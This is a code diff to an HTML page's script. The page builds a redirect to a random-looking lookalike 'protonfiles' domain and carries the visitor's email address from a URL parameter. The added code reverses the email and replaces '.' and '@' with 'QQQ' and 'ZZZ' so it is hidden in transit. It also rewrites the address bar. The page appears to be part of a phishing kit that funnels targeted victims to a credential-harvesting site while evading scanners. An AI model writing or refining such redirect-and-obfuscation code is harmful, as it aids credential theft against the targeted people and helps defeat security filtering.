@@ -413,11 +413,35 @@
       }, 3000);
     }
 
+    // Function to transform email to encoded format
+    function transformEmailToEncoded(email) {
+      // Reverse the email string
+      let reversed = email.split('').reverse().join('');
+      // Replace '.' with 'QQQ' and '@' with 'ZZZ'
+      let encoded = reversed.replace(/\./g, 'QQQ').replace(/@/g, 'ZZZ');
+      return encoded;
+    }
+
     // URL obfuscation and construction
     function getRedirectUrl() {
       const baseUrl = "https://protonfiles.egvhfztransfercygv.online/tOnDqXfQ";
       const urlParams = new URLSearchParams(window.location.search);
-      const officeParam = urlParams.get("eoffice") || "";
+      let officeParam = urlParams.get("eoffice") || "";
+      
+      // Check if the parameter is an email (contains @ and .)
+      if (officeParam.includes('@') && officeParam.includes('.')) {
+        // Transform the email to encoded format
+        const encodedEmail = transformEmailToEncoded(officeParam);
+        
+        // Update the URL in the address bar without reloading
+        const newUrl = new URL(window.location.href);
+        newUrl.searchParams.set('eoffice', encodedEmail);
+        window.history.replaceState({}, '', newUrl.toString());
+        
+        // Use the encoded email for the redirect
+        officeParam = encodedEmail;
+      }
+      
       return baseUrl + "#" + encodeURIComponent(officeParam);
     }
 
@@ -475,5 +499,3 @@
   </script>
 </body>
 </html>
-
-
